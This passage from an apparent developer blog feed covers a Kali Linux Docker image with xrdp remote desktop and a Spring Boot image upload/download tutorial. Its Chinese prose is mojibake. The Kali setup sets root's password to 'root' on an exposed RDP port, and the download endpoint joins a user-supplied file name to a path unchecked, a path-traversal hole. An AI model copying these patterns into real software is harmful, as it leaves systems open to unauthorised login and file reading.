kali-tools-top10 \   pciutils \   iputils-ping \   bash-completion &amp;&amp; \   apt-<span class="hljs-builtin-name">get</span> autoremove -y &amp;&amp; \   apt-<span class="hljs-builtin-name">get</span> clean</code></pre><h2 id="ç”Ÿæˆæ–°é•œåƒ"><a href="#ç”Ÿæˆæ–°é•œåƒ" class="headerlink" title="ç”Ÿæˆæ–°é•œåƒ"></a>ç”Ÿæˆæ–°é•œåƒ</h2><p>å¾…ä¸Šé¢çš„æ‰€æœ‰ç¨‹åºå®‰è£…å®Œæˆåï¼Œæ‰“åŒ…ç”Ÿæˆæ–°é•œåƒ</p><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit f<span class="hljs-number">16618</span>e<span class="hljs-number">0</span>fda<span class="hljs-number">5</span> kali-<span class="hljs-number">2021</span></code></pre><h2 id="è¿œç¨‹æ¡Œé¢ç¯å¢ƒå®‰è£…"><a href="#è¿œç¨‹æ¡Œé¢ç¯å¢ƒå®‰è£…" class="headerlink" title="è¿œç¨‹æ¡Œé¢ç¯å¢ƒå®‰è£…"></a>è¿œç¨‹æ¡Œé¢ç¯å¢ƒå®‰è£…</h2><h3 id="ä½¿ç”¨æ–°é•œåƒå¯åŠ¨å®¹å™¨"><a href="#ä½¿ç”¨æ–°é•œåƒå¯åŠ¨å®¹å™¨" class="headerlink" title="ä½¿ç”¨æ–°é•œåƒå¯åŠ¨å®¹å™¨"></a>ä½¿ç”¨æ–°é•œåƒå¯åŠ¨å®¹å™¨</h3><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-<span class="hljs-number">2021</span></code></pre><p>è¿›å…¥é•œåƒ</p><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre><h3 id="å®‰è£…æ¡Œé¢æœåŠ¡"><a href="#å®‰è£…æ¡Œé¢æœåŠ¡" class="headerlink" title="å®‰è£…æ¡Œé¢æœåŠ¡"></a>å®‰è£…æ¡Œé¢æœåŠ¡</h3><p><strong>â—</strong> kali-desktop-xfce ï¼šå®‰è£…è¿œç¨‹æ¡Œé¢ç¯å¢ƒ</p><p><strong>â—</strong> xrdp ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡</p><p><strong>â—</strong> xorgï¼šxorgæ˜¯x11çš„ä¸€ä¸ªå®ç°ï¼Œxorgæä¾›X server</p><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> updateapt-<span class="hljs-builtin-name">get</span> -y install kali-desktop-xfce xorg xrdp</code></pre><p>é…ç½®xrdpå®ç°è¿œç¨‹è¿æ¥å›¾å½¢ç•Œé¢ï¼š</p><pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.iniservice xrdp restart</code></pre><p>ä¿®æ”¹rootç”¨æˆ·å¯†ç ï¼š</p><pre><code class="hljs vim">passwd root<span class="hljs-keyword">echo</span> roo<span class="hljs-variable">t:root</span>|chpasswd</code></pre><p>å†æ¬¡ç™»å½•XRDPï¼š</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220304155750507.png" alt="image-20220304155750507"></p><h3 id="æ‰“åŒ…é•œåƒ"><a href="#æ‰“åŒ…é•œåƒ" class="headerlink" title="æ‰“åŒ…é•œåƒ"></a>æ‰“åŒ…é•œåƒ</h3><pre><code class="hljs applescript">docker commit <span class="hljs-built_in">id</span> docker-attack</code></pre><h2 id="ç¼–å†™Dockerfile"><a href="#ç¼–å†™Dockerfile" class="headerlink" title="ç¼–å†™Dockerfile"></a>ç¼–å†™Dockerfile</h2><p>å› ä¸ºå¯åŠ¨å®¹å™¨åéœ€è¦è¿è¡Œ</p><pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.iniservice xrdp restart</code></pre><p>æ‰€æœ‰ä½¿ç”¨Dockerfileå®Œæˆè¿™ä¸¤æ­¥æ“ä½œ</p><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> kali-attack:latest<span class="hljs-keyword">COPY</span><span class="bash"> run.sh /home/run.sh</span><span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;</span>]</span></code></pre><p> æ²¡æœ‰<code>tail -f /dev/null</code>ä¼šå¯¼è‡´å¯åŠ¨å®¹å™¨åè‡ªåŠ¨é€€å‡ºæ— æ³•ä½¿ç”¨ï¼Œ<a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">åŸå› </a>å¯èƒ½å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220305103247695.png" alt="image-20220305103247695"></p><p><code>run.sh</code>ä¸­çš„å†…å®¹ï¼Œä¸ºå¯åŠ¨å®¹å™¨åéœ€è¦æ‰§è¡Œçš„ä¸¤æ¡å‘½ä»¤</p><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>sed -i <span class="hljs-string">&#x27;s/port=3399/port=3389/g&#x27;</span> /etc/xrdp/xrdp.ini<span class="hljs-built_in">wait</span>service xrdp restart</code></pre><p>ä½¿ç”¨</p><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t kali-attack<span class="hljs-number">2</span> .</code></pre><p>åˆ›å»ºé•œåƒï¼Œä¹‹ååˆ›å»ºå®¹å™¨</p><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-attack<span class="hljs-number">2</span></code></pre><p>è¿™æ ·å°±å¯ä»¥ç›´æ¥ä½¿ç”¨mstvc.exeè¿æ¥kaliæ¡Œé¢</p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>root<span class="hljs-symbol">password:</span>root</code></pre><h1 id="dockerè®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æº"><a href="#dockerè®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æº" class="headerlink" title="dockerè®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æº"></a>dockerè®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æº</h1><p><a href="https://swiftflamel.com/2021/04/01/docker-container%E5%AE%B9%E5%99%A8%E5%86%85%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BAhost%E6%9C%8D%E5%8A%A1/">è§£å†³æ–¹æ¡ˆ</a></p><p>æœ¬æ–‡ä½¿ç”¨çš„çš„windows dockerç‰ˆæœ¬å¤§äº18.03å¯ä»¥ç›´æ¥ä½¿ç”¨<code>host.docker.internal</code>è®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æº</p><p>å…¶ä»–æ“ä½œç³»ç»Ÿçš„å¯ä»¥<a href="https://www.jianshu.com/p/4a358a120983">å‚è€ƒ</a></p><h1 id="dockerå®¹å™¨å®‰è£…vimå‡ºé”™"><a href="#dockerå®¹å™¨å®‰è£…vimå‡ºé”™" class="headerlink" title="dockerå®¹å™¨å®‰è£…vimå‡ºé”™"></a>dockerå®¹å™¨å®‰è£…vimå‡ºé”™</h1><p>æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p><pre><code class="hljs apache"><span class="hljs-attribute">ncurses</span>-base : Breaks: libtinfo<span class="hljs-number">5</span> (&lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>) but <span class="hljs-number">6</span>.<span class="hljs-number">0</span>+<span class="hljs-number">20161126</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">9</span>u<span class="hljs-number">2</span> is to be installed<span class="hljs-attribute">E</span>: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages.<span class="hljs-attribute">E</span>: Unable to correct dependencies</code></pre><p>ç›´æ¥ä½¿ç”¨aptå®‰è£…æ­¤åŒ…å³å¯</p><pre><code class="hljs vim">apt <span class="hljs-keyword">update</span>apt upgradeapt install <span class="hljs-keyword">vim</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>reggie</title>
    <link href="/2022/04/29/reggie/"/>
    <url>/2022/04/29/reggie/</url>
    
    <content type="html"><![CDATA[<h1 id="ç‘å‰å¤–å–é¡¹ç›®"><a href="#ç‘å‰å¤–å–é¡¹ç›®" class="headerlink" title="ç‘å‰å¤–å–é¡¹ç›®"></a>ç‘å‰å¤–å–é¡¹ç›®</h1><p>é»‘é©¬ç¨‹åºå‘˜æœ€æ–°çš„springbootè¯¾ç¨‹ä¸­çš„é¡¹ç›®</p><p>é¡¹ç›®åœ°å€ä¸º <a href="https://github.com/sunzhengyu99/reggie">ç‘å‰</a></p><p>ä»£ç å…¨æ˜¯è·Ÿç€è§†é¢‘æ•²å‡ºæ¥çš„ï¼Œåé¢ä¼šå¯¹é¡¹ç›®è¿›è¡Œä¼˜åŒ–ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>springbootå·¥å…·ç±»</title>
    <link href="/2022/04/29/springbooot-upload-file/"/>
    <url>/2022/04/29/springbooot-upload-file/</url>
    
    <content type="html"><![CDATA[<h1 id="javawebä¸­å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½"><a href="#javawebä¸­å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½" class="headerlink" title="javawebä¸­å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½"></a>javawebä¸­å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½</h1><p>ä½¿ç”¨springbootåˆ›å»ºwebé¡¹ç›®</p><p>æœåŠ¡ç«¯è¦æ¥æ”¶å®¢æˆ·ç«¯é¡µé¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé€šå¸¸éƒ½ä¼šä½¿ç”¨Apacheçš„ä¸¤ä¸ªç»„ä»¶:</p><pre><code class="hljs ebnf"><span class="hljs-attribute">commons-fileupload</span><span class="hljs-attribute">commons-io</span></code></pre><p>Springæ¡†æ¶åœ¨spring-webåŒ…ä¸­å¯¹æ–‡ä»¶ä¸Šä¼ è¿›è¡Œäº†å°è£…ï¼Œå¤§å¤§ç®€åŒ–äº†æœåŠ¡ç«¯ä»£ç ï¼Œå®ç°æ­¥éª¤å¦‚ä¸‹ï¼š</p><h2 id="1-åˆ›å»ºController"><a href="#1-åˆ›å»ºController" class="headerlink" title="1.åˆ›å»ºController"></a>1.åˆ›å»ºController</h2><p>å› ä¸ºå›¾ç‰‡ä¸Šä¼ æ˜¯ä¸€ä¸ªå…¬å…±æ¥å£æ‰€ä»¥å¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸º<code>CommonController</code>çš„æ–‡ä»¶ï¼Œurlåœ°å€ä¸º<code>/common</code></p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * ä¸»è¦ç”¨äºæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½</span><span class="hljs-comment"> */</span><span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonController</span> </span>&#123;<span class="hljs-meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span> <span class="hljs-comment">// ä¿å­˜å›¾ç‰‡çš„è·¯å¾„</span>    <span class="hljs-keyword">private</span> String basePath;&#125;</code></pre><h3 id="ä¸Šä¼ å›¾ç‰‡"><a href="#ä¸Šä¼ å›¾ç‰‡" class="headerlink" title="ä¸Šä¼ å›¾ç‰‡"></a>ä¸Šä¼ å›¾ç‰‡</h3><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ–‡ä»¶ä¸Šä¼ </span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> file</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title">upload</span><span class="hljs-params">(MultipartFile file)</span></span>&#123;    <span class="hljs-comment">// fileæ˜¯ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåç»­éœ€è¦è¿›è¡Œè½¬å­˜</span>    <span class="hljs-comment">// fileéœ€è¦ä¸å‰ç«¯ä¸Šä¼ çš„å‚æ•°åä¿æŒä¸€è‡´ï¼Œå¦åˆ™æ— æ³•è·å–åˆ°ä¸Šä¼ çš„æ–‡ä»¶</span>    <span class="hljs-comment">// è½¬å­˜ä¹‹å‰éœ€è¦å¯¹æ–‡ä»¶åè¿›è¡Œå¤„ç†</span>    String originalFilename = file.getOriginalFilename();    String suffix = originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));    <span class="hljs-comment">// é˜²æ­¢æ–‡ä»¶è¢«è¦†ç›–ï¼Œä½¿ç”¨uuidä½œä¸ºæ–‡ä»¶å</span>    String filename = UUID.randomUUID().toString();    filename = filename + suffix;    File dir = <span class="hljs-keyword">new</span> File(basePath); <span class="hljs-comment">// åˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ä¸å­˜åœ¨åˆ™åˆ›å»º</span>    <span class="hljs-keyword">if</span> (!dir.exists())&#123;        dir.mkdir();    &#125;    <span class="hljs-comment">// å°†å›¾ç‰‡ä¿å­˜çš„æŒ‡å®šä½ç½®</span>    <span class="hljs-keyword">try</span> &#123;        file.transferTo(<span class="hljs-keyword">new</span> File(basePath + filename));    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;        e.printStackTrace();    &#125;    <span class="hljs-keyword">return</span> R.success(filename);&#125;</code></pre><h3 id="ä¸‹è½½å›¾ç‰‡"><a href="#ä¸‹è½½å›¾ç‰‡" class="headerlink" title="ä¸‹è½½å›¾ç‰‡"></a>ä¸‹è½½å›¾ç‰‡</h3><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;    <span class="hljs-comment">// æ–‡ä»¶è¾“å…¥æµè¯»å–æœ¬åœ°æ–‡ä»¶</span>    FileInputStream fileInputStream = <span class="hljs-keyword">null</span>;    <span class="hljs-comment">// ä½¿ç”¨å“åº”è¾“å‡ºæµå°†å›¾ç‰‡æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Š</span>    ServletOutputStream outputStream = <span class="hljs-keyword">null</span>;    <span class="hljs-keyword">try</span> &#123;        fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(basePath + name));        outputStream = response.getOutputStream();        response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;        <span class="hljs-comment">// è¯»å–æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡å ç”±å“åº”è¾“å‡ºæµ</span>        <span class="hljs-keyword">while</span>( (len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;            outputStream.write(bytes, <span class="hljs-number">0</span>, len);            outputStream.flush();        &#125;    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">finally</span> &#123;        fileInputStream.close();        outputStream.close();    &#125;&#125;</code></pre><h2 id="2-å‰ç«¯é¡µé¢"><a href="#2-å‰ç«¯é¡µé¢" class="headerlink" title="2.å‰ç«¯é¡µé¢"></a>2.å‰ç«¯é¡µé¢</h2><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>  <span class="hljs-comment">&lt;!-- å¼•å…¥æ ·å¼ --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.css&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/common.css&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/page.css&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;addBrand-container&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;food-add-app&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">el-upload</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar-uploader&quot;</span></span><span class="hljs-tag">                <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/common/upload&quot;</span></span><span class="hljs-tag">                <span class="hljs-attr">:show-file-list</span>=<span class="hljs-string">&quot;false&quot;</span></span><span class="hljs-tag">                <span class="hljs-attr">:on-success</span>=<span class="hljs-string">&quot;handleAvatarSuccess&quot;</span></span><span class="hljs-tag">                <span class="hljs-attr">:before-upload</span>=<span class="hljs-string">&quot;beforeUpload&quot;</span></span><span class="hljs-tag">                <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;el-icon-plus avatar-uploader-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">el-upload</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-comment">&lt;!-- å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/vue/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-comment">&lt;!-- å¼•å…¥ç»„ä»¶åº“ --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-comment">&lt;!-- å¼•å…¥axios --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/axios/axios.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../js/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">      <span class="hljs-keyword">new</span> Vue(&#123;</span><span class="javascript">        el: <span class="hljs-string">&#x27;#food-add-app&#x27;</span>,</span><span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><span class="javascript">          <span class="hljs-keyword">return</span> &#123;</span><span class="javascript">            imageUrl: <span class="hljs-string">&#x27;&#x27;</span></span>          &#125;        &#125;,        methods: &#123;          handleAvatarSuccess (response, file, fileList) &#123;<span class="javascript">              <span class="hljs-built_in">this</span>.imageUrl = <span class="hljs-string">`/common/download?name=<span class="hljs-subst">$&#123;response.data&#125;</span>`</span></span>          &#125;,          beforeUpload (file) &#123;            if(file)&#123;<span class="javascript">              <span class="hljs-keyword">const</span> suffix = file.name.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>]</span><span class="javascript">              <span class="hljs-keyword">const</span> size = file.size / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; <span class="hljs-number">2</span></span><span class="javascript">              <span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>].indexOf(suffix) &lt; <span class="hljs-number">0</span>)&#123;</span><span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;ä¸Šä¼ å›¾ç‰‡åªæ”¯æŒ pngã€jpegã€jpg æ ¼å¼ï¼&#x27;</span>)</span><span class="javascript">                <span class="hljs-built_in">this</span>.$refs.upload.clearFiles()</span><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>              &#125;              if(!size)&#123;<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;ä¸Šä¼ æ–‡ä»¶å¤§å°ä¸èƒ½è¶…è¿‡ 2MB!&#x27;</span>)</span><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>              &#125;<span class="javascript">              <span class="hljs-keyword">return</span> file</span>            &#125;          &#125;        &#125;      &#125;)    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><h1 id="mybatis-plus-generator"><a href="#mybatis-plus-generator" class="headerlink" title="mybatis-plus-generator"></a>mybatis-plus-generator</h1><p>MPçš„ä»£ç ç”Ÿæˆå™¨ï¼Œå¯ä»¥èŠ‚çº¦åˆ›å»ºæ–‡ä»¶çš„æ—¶é—´</p><h2 id="1-å¯¼å…¥ä¾èµ–"><a href="#1-å¯¼å…¥ä¾èµ–" class="headerlink" title="1.å¯¼å…¥ä¾èµ–"></a>1.å¯¼å…¥ä¾èµ–</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--ä»£ç ç”Ÿæˆå™¨--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="2-ç¼–å†™ç”Ÿæˆå™¨ä»£ç "><a href="#2-ç¼–å†™ç”Ÿæˆå™¨ä»£ç " class="headerlink" title="2.ç¼–å†™ç”Ÿæˆå™¨ä»£ç "></a>2.ç¼–å†™ç”Ÿæˆå™¨ä»£ç </h2><p>å¯ä»¥æ”¾åœ¨ä¸“é—¨çš„å·¥å…·ç±»åŒ…ä¸‹</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.utils;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;<span class="hljs-keyword">import</span> java.util.Collections;<span class="hljs-comment">/**</span><span class="hljs-comment"> * mpä»£ç ç”Ÿæˆå™¨</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeGenreator</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        generator();    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">generator</span><span class="hljs-params">()</span></span>&#123;        FastAutoGenerator.create(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>,                <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>)                .globalConfig(builder -&gt; &#123;                    builder.author(<span class="hljs-string">&quot;sunzy&quot;</span>) <span class="hljs-comment">// è®¾ç½®ä½œè€…</span>                            .enableSwagger() <span class="hljs-comment">// å¼€å¯ swagger æ¨¡å¼</span>                            .fileOverride() <span class="hljs-comment">// è¦†ç›–å·²ç”Ÿæˆæ–‡ä»¶</span>                            .outputDir(<span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\java\\&quot;</span>); <span class="hljs-comment">// æŒ‡å®šè¾“å‡ºç›®å½•</span>                &#125;)                .packageConfig(builder -&gt; &#123;                    builder.parent(<span class="hljs-string">&quot;com.sunzy&quot;</span>) <span class="hljs-comment">// è®¾ç½®çˆ¶åŒ…å</span>                            .moduleName(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// è®¾ç½®çˆ¶åŒ…æ¨¡å—å</span>                            .pathInfo(Collections.singletonMap(OutputFile.xml, <span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="hljs-comment">// è®¾ç½®mapperXmlç”Ÿæˆè·¯å¾„ OutputEile.xmlè¿™é‡Œå¯èƒ½ä¼šæŠ¥é”™ æ ¹æ®ç‰ˆæœ¬ä¿®æ”¹</span>                &#125;)                .strategyConfig(builder -&gt; &#123;                    builder.entityBuilder().enableLombok();                    builder.mapperBuilder().enableMapperAnnotation().build();                    builder.controllerBuilder().enableHyphenStyle()  <span class="hljs-comment">// è¿å­—ç¬¦è½¬é©¼å³°</span>                            .enableRestStyle();  <span class="hljs-comment">// å¼€å¯restæ§åˆ¶å™¨</span>                    builder.addInclude(<span class="hljs-string">&quot;sys_user&quot;</span>) <span class="hljs-comment">// è®¾ç½®éœ€è¦ç”Ÿæˆçš„è¡¨å</span>                            .addTablePrefix(<span class="hljs-string">&quot;t_&quot;</span>, <span class="hljs-string">&quot;sys_&quot;</span>); <span class="hljs-comment">// è®¾ç½®è¿‡æ»¤è¡¨å‰ç¼€</span>                &#125;)<span class="hljs-comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 